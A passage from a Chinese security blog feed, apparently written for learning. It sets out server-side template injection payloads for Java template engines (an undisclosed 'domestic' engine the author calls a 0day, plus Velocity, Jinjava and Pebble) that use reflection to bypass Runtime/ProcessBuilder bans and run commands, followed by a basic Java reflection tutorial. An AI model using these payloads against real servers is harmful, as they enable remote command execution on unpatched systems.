title="前言"></a>前言</h2><p>&emsp;&emsp; 这里模板引擎是国内的模板引擎，漏洞还未必收录，故暂不公布，这里只做学习研究。如果你无意中接触过这个模板，如果你认出了这个模板，那么恭喜你获得0day一枚。笔者有一个请求如果你认出了，就不要公布了，0day你自己知道就好了。此款模板引擎禁止使用了<code>java.lang.Runtime</code>和<code>java.lang.ProcessBuilder</code>类的使用，使用Java的反射机制完美的bypass。</p><h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure><ol><li>我们且看第一行，按照上面给出简单案例方法，我们应该这样子就可以了<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(newInstance(),&quot;calc&quot;)</code></li><li>但是直接String.class直接写模板是找不到的，所以我们得继续构造payload，将String.class转化<code>@java.lang.Class.forName(&quot;java.lang.String&quot;)</code>的形式，然后payload就变成下面这样子了。<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,@java.lang.Class.forName(&quot;java.lang.String&quot;)).invoke(newInstance(),&quot;calc&quot;)</code></li><li>照道理上面就可以直接使用了，但是呢Runtime类没有无参构造方法，因此不能使用newInstance()方法来实例化。只能通过调用getRuntime()方法来进行实例化。所以newInstance()得替换成<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null)</code>最终payload就变成了下面这样子。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp; Velocity是一个基于Java的模板引擎，是隶属于Apache旗下的一个开源项目。它允许任何人使用简单而强大的模板语言来引用Java代码中定义的对象。<br>&emsp;&emsp; 下面是Velocity的SSTI的payload，此时的你可能会有个疑问。payload语法好像有点奇怪？这个其实是模板语法，每一个模板引擎的语法都不同。笔者觉得大同小异，有过编程的基础童鞋，稍加学习就能明白。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set($x="")  </span><br><span class="line">#set($rt=$x.class.forName("java.lang.Runtime"))</span><br><span class="line">#set($chr=$x.class.forName("java.lang.Character"))  </span><br><span class="line">#set($str=$x.class.forName("java.lang.String"))</span><br><span class="line">#set($ex=$rt.getRuntime().exec("calc"))$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h3 id="set语法"><a href="#set语法" class="headerlink" title="#set语法"></a>#set语法</h3><p>&emsp;&emsp;  #set语法可以创建一个Velocity的变量，#set语法对应的Velocity语法树是ASTSetDirective类，翻开这个类的代码，可以发现它有两个子节点：分别是RightHandSide和LeftHandSide，分别代表“=”两边的表达式值。与Java语言的赋值操作有点不一样的是，左边的LeftHandSide可能是一个变量标识符，也可能是一个set方法调用。变量标识符很好理解，如前面的#set($ var=“偶数”)，另外是一个set方法调用，如#set($person.name=”junshan”)，这实际上相当于Java中person.setName(“junshan”)方法的调用。</p><h3 id="foreach语法"><a href="#foreach语法" class="headerlink" title="foreach语法"></a>foreach语法</h3><p>&emsp;&emsp; Velocity中的循环语法只有这一种，它与Java中的for循环的语法糖形式十分类似，如#foreach($ child in $person.children) $ person.children表示的是一个集合，它可能是一个List集合或者一个数组，而$ child表示的是每个从集合中取出的值。从render方法代码中可以看出，Velocity首先是取得$ person.children的值，然后将这个值封装成Iterator集合，然后依次取出这个集合中的每一个值，将这个值以$child为变量标识符放入context中。除此以外需要特别注意的是，Velocity在循环时还在context中放入了另外两个变量，分别是counterName和hasNextName，这两个变量的名称分别在配置文件配置项directive.foreach.counter.name和directive.foreach.iterator.name中定义，它们表示当前的循环计数和是否还有下一个值。前者相当于for(int i=1;i&lt;10;i++)中的i值，后者相当于while(it.hasNext())中的it.hasNext()的值，这两个值在#foreach的循环体中都有可能用到。由于elementKey、counterName和hasNextName是在#foreach中临时创建的，如果当前的context中已经存在这几个变量，要把原始的变量值保存起来，以便在这个#foreach执行结束后恢复。如果context中没有这几个变量，那么#foreach执行结束后要删除它们，这就是代码最后部分做的事情，这与我们前面介绍的#set语法没有范围限制不同，#foreach中临时产生的变量只在#foreach中有效。</p><p>更多语法知识推荐<a href="http://www.yunshouce.com/g62/velocitydoc/11.html" target="_blank" rel="noopener">Velocity中文文档</a>。</p><hr><h2 id="反射Payload"><a href="#反射Payload" class="headerlink" title="反射Payload"></a>反射Payload</h2><p>&emsp;&emsp; 了解语法之后，回头看payload会觉得很简单，其实就是基本的payload的构造。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set($x="")  </span><br><span class="line">#set($rt=$x.class.forName("java.lang.Runtime"))</span><br><span class="line">#set($chr=$x.class.forName("java.lang.Character"))  </span><br><span class="line">#set($str=$x.class.forName("java.lang.String"))</span><br><span class="line">#set($ex=$rt.getRuntime().exec("calc"))$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>把payload转化成伪代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rt = java.lang.Runtime<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">chr</span> </span>= java.lang.String</span><br><span class="line">ex = java.lang.Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br><span class="line">ex.waitFor()</span><br><span class="line"><span class="comment">// 接着就是循环读取输出</span></span><br></pre></td></tr></table></figure><p><strong>推荐一个经典案例</strong><br><a href="https://samny.blog.csdn.net/article/details/102843715" target="_blank" rel="noopener">Apache Solr 模板注入远程命令执行</a>漏洞详情<br><a href="https://samny.blog.csdn.net/article/details/104881477" target="_blank" rel="noopener">白头搔更短，SSTI惹人心！</a>漏洞分析</p><hr><h1 id="Jinjava"><a href="#Jinjava" class="headerlink" title="Jinjava"></a>Jinjava</h1><h2 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp; Jinjava是一款开源的 Java 模板引擎，基于 django 模板语法，适用于渲染 jinja 模板（至少是 HubSpot 内容中使用的 jinja 子集）。目前在生产中用于渲染<code>HubSpot CMS</code>，每月有数以亿计的页面浏览量的网站。<a href="https://github.com/HubSpot/jinjava" target="_blank" rel="noopener">官方GitHub地址</a>。<br>判断Jinjava是否存在SSTI漏洞的payload：</p><ol><li>A 回显大写``A``</li><li> 会返回一个请求对象 例如：``com.[...].context.TemplateContextRequest@23548206``</li></ol><h2 id="反射Payload-1"><a href="#反射Payload-1" class="headerlink" title="反射Payload"></a>反射Payload</h2><p>&emsp;&emsp; 这款模板引擎的payload直接就能看出是用Java的反射机制，都是先获取的<code>javax.script.ScriptEngineManager</code>类对象，然后<code>newInstance()</code>实例化，在之后创建一个<code>JavaScript</code>引擎最后执行命令。<br><img src="https://img-blog.csdnimg.cn/20200430101257182.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"new java.lang.String(<span class="string">'xxx'</span>)\")&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")&#125;&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="Pebble"><a href="#Pebble" class="headerlink" title="Pebble"></a>Pebble</h1><p>&emsp;&emsp; Pebble是一个受Twig启发的java模板化引擎。它以其继承功能和易读的语法从人群中脱颖而出。它内置了安全的自动缩放功能，并且包含了对国际化的集成支持。更多内容查看<a href="https://github.com/PebbleTemplates/pebble" target="_blank" rel="noopener">官方GitHub地址</a>，<a href="https://pebbletemplates.io/wiki/guide/basic-usage/" target="_blank" rel="noopener">官方文档</a>。<br>payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set cmd = <span class="string">'id'</span> %&#125;</span><br><span class="line">&#123;% set bytes = (<span class="number">1</span>).TYPE</span><br><span class="line">     .forName(<span class="string">'java.lang.Runtime'</span>)</span><br><span class="line">     .methods[<span class="number">6</span>]</span><br><span class="line">     .invoke(<span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">     .exec(cmd)</span><br><span class="line">     .inputStream</span><br><span class="line">     .readAllBytes() %&#125;</span><br><span class="line">&#123;&#123; (<span class="number">1</span>).TYPE</span><br><span class="line">     .forName(<span class="string">'java.lang.String'</span>)</span><br><span class="line">     .constructors[<span class="number">0</span>]</span><br><span class="line">     .newInstance(([bytes]).toArray()) &#125;&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 各大模板引擎在设计的时候，都或多或少变相禁止<code>java.lang.Runtime</code>和<code>java.lang.Processbuilder</code>类，因此使用Java的反射机制可以完全的绕过限制。想要深入学习SSTI漏洞的时候，建议看模板引擎官方给出的文档，在结合JDK文档大多数模板引擎是可以bypass的。</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://samny.blog.csdn.net/article/details/104881477" target="_blank" rel="noopener">https://samny.blog.csdn.net/article/details/104881477</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;首发：&lt;a href=&quot;https://www.sec-in.com/article/309&quot; target=&quot;_blank&quot; rel=&quot;n
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java反射" scheme="http://yoursite.com/tags/Java%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>从安全角度谈Java反射机制--序章</title>
    <link href="http://yoursite.com/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%BA%8F%E7%AB%A0/"/>
    <id>http://yoursite.com/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%BA%8F%E7%AB%A0/</id>
    <published>2020-05-12T08:42:16.000Z</published>
    <updated>2020-05-13T02:30:32.232Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首发：<a href="https://www.sec-in.com/article/307" target="_blank" rel="noopener">https://www.sec-in.com/article/307</a><br>&emsp;&emsp; 众所周知，Java目前影响最大的是反序列化漏洞，换一句话说Java安全是从反序列化漏洞开始，但反序列化漏洞又可以基于反射，这次笔者带你走进Java安全的大门。<br>&emsp;&emsp; Java反序列化的payload大多与反射机制密切相关，但仅仅是因为这个吗？答案肯定是片面的。反射作为大多数编程语言里必不可缺的组成部分，对象可以通过反射获取其他的类，类可以通过反射拿到所有的方法（包括私有方法），获取到方法可以调用。一句话，反射给Java等类似的静态语言赋予了<code>“灵魂”</code>。</p><p>ps: 本文实验代码都上传<a href="https://github.com/samny520/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>项目，为了让更多人知道，麻烦动动小手star一下。</p><hr><h1 id="反射基础"><a href="#反射基础" class="headerlink" title="反射基础"></a>反射基础</h1><p>&emsp;&emsp; Java反射操作的对象是<code>java.lang.Class</code>对象，如果想要使用Java反射，首先得获取Class对象。下面我们看一段代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">Class cls = Class.forName(className);</span><br><span class="line">cls.getMethod(methodName).invoke(cls.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码中，笔者演示几个比较重要的方法：</p><ul><li>获取类对象的方法<code>forName</code></li><li>从获取类对象中获取方法 <code>getMethod</code></li><li>执行得到获取的方法的方法<code>invoke</code></li><li>实例化对象<code>newInstance</code></li></ul><p>ps：当然反射不可能仅仅只是这些方法，下面中笔者有提及其他的方法，当然不可能是全部都一一道来，正所谓<code>授之与鱼，不如授之于渔</code>。更多方法建议大家去看JDK文档，在线的文档百度一搜就有。</p><hr><h2 id="类源码"><a href="#类源码" class="headerlink" title="类源码"></a>类源码</h2><p>&emsp;&emsp; 首先笔者构造了两个类<code>students</code>和<code>classdemo1</code>。</p><hr><h3 id="实体类students源码："><a href="#实体类students源码：" class="headerlink" title="实体类students源码："></a>实体类<code>students</code>源码：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Students</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer age = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">"samny"</span>;</span><br><span class="line">    <span class="keyword">private</span> Integer CardId = <span class="number">332323223</span>;</span><br><span class="line">    <span class="keyword">private</span> Integer id = <span class="number">10012</span>;</span><br><span class="line">    <span class="keyword">private</span> String hello = <span class="string">"hello world"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Students</span><span class="params">(Integer age, String name, Integer cardId, Integer id, String hello)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.CardId = cardId;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.hello = hello;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Students&#123;"</span> +</span><br><span class="line">                <span class="string">"age="</span> + age +</span><br><span class="line">                <span class="string">", name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", CardId="</span> + CardId +</span><br><span class="line">                <span class="string">", id="</span> + id +</span><br><span class="line">                <span class="string">", ags='"</span> + hello + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Students</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 以下省略set，get以及toString方法。</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="实体类classdemo1的源码："><a href="#实体类classdemo1的源码：" class="headerlink" title="实体类classdemo1的源码："></a>实体类<code>classdemo1</code>的源码：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">classdemo1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  String  name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"parameterlessMethod：hello"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print2</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println( <span class="string">"parameterMethod: hello"</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="反射方法获取Students类。"><a href="#反射方法获取Students类。" class="headerlink" title="反射方法获取Students类。"></a>反射方法获取Students类。</h3><blockquote><p>实例化所需要的类集合  Class[] classes = new Class[]{Integer.class,String.class,Integer.class,Integer.class,String.class};<br>通过构造器构造类Constructor constructor = cls.getDeclaredConstructor(classes);<br>通过调用有参构造器实例化类Object str = constructor.newInstance(18, “samny”, 32326663, 10021, “hello!!”);</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reflectmethod1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取对象</span></span><br><span class="line"></span><br><span class="line">            Class cls = Class.forName(<span class="string">"samny.reflection.Students"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//            // 获取构造器方法</span></span><br><span class="line">            Class[] classes = <span class="keyword">new</span> Class[]&#123;Integer<span class="class">.<span class="keyword">class</span>,<span class="title">String</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">                    <span class="title">Integer</span>.<span class="title">class</span>,<span class="title">Integer</span>.<span class="title">class</span>,<span class="title">String</span>.<span class="title">class</span>&#125;</span>;</span><br><span class="line">            Constructor constructor = cls.getDeclaredConstructor(classes);</span><br><span class="line"></span><br><span class="line">            Object str = constructor.newInstance(<span class="number">18</span>, <span class="string">"samny"</span>, <span class="number">32326663</span>, <span class="number">10021</span>, <span class="string">"hello!!"</span>);</span><br><span class="line">            System.out.println(str);</span><br><span class="line">            <span class="comment">// 或者下面这样子输出</span></span><br><span class="line"><span class="comment">//            System.out.println(constructor.newInstance(18, "samny", 32326663, 10021, "hello!!"));</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException |</span><br><span class="line">                IllegalAccessException | InstantiationException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="常规开发人员实例化类构造类demo"><a href="#常规开发人员实例化类构造类demo" class="headerlink" title="常规开发人员实例化类构造类demo"></a>常规开发人员实例化类构造类demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Sts</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Students students = <span class="keyword">new</span> Students();</span><br><span class="line">        students.setAge(<span class="number">18</span>);</span><br><span class="line">        students.setName(<span class="string">"samny"</span>);</span><br><span class="line">        students.setCardId(<span class="number">32336666</span>);</span><br><span class="line">        students.setId(<span class="number">1001</span>);</span><br><span class="line">        students.setAgs(<span class="string">"helloooo!!"</span>);</span><br><span class="line">        System.out.println(students.toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对比一下效果是没有任何的区别，但反射操作只需要知道类名就可以完全操作类甚至是类中的私有方法之后文章会详细说明，本文不做说明。<br><img src="https://img-blog.csdnimg.cn/20200428161706305.png" alt="在这里插入图片描述"></p><hr><h3 id="反射调用类中的无参和有参方法。"><a href="#反射调用类中的无参和有参方法。" class="headerlink" title="反射调用类中的无参和有参方法。"></a>反射调用类中的无参和有参方法。</h3><blockquote><p>之前说过的知识就不在说明<br>开头就说了，invoke是执行获取类得到方法的方法<br>但调用有参方法和无参方法有点细微的差别<br><code>getMethod</code>方法的第一个参数是类方法名称，第二个是类对象。这里先留个疑问，如果是多个类对象呢？<br><code>invoke</code>函数的第一个参数是<code>实例化</code>的类对象，第二个是参数值<br>常规方法的调用，直接<code>Class.method()</code>即可</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reflectmethod2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class  cls = Class.forName(<span class="string">"samny.reflection.classdemo1"</span>);</span><br><span class="line">            <span class="comment">// 无参方法调用</span></span><br><span class="line">            Object ob = cls.newInstance();</span><br><span class="line"><span class="comment">//            Method mt = cls.getMethod("print"); 有没有null均可</span></span><br><span class="line">            Method mt = cls.getMethod(<span class="string">"print"</span>,<span class="keyword">null</span>);</span><br><span class="line">            mt.invoke(ob,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">// 有参方法调用</span></span><br><span class="line">            Method mt2 = cls.getMethod(<span class="string">"print2"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            mt2.invoke(ob,<span class="string">"world"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200428162508475.png" alt="在这里插入图片描述"></p><hr><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>P神-Java安全漫谈-反射篇</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;首发：&lt;a href=&quot;https://www.sec-in.com/article/307&quot; target=&quot;_blank&quot; rel=&quot;n
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java反射" scheme="http://yoursite.com/tags/Java%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>从安全角度谈Java反射机制--前章</title>
    <link href="http://yoursite.com/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%89%8D%E7%AB%A0/"/>
    <id>http://yoursite.com/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%89%8D%E7%AB%A0/</id>
    <published>2020-05-12T04:42:16.000Z</published>
    <updated>2020-05-13T02:29:56.559Z</updated>
    
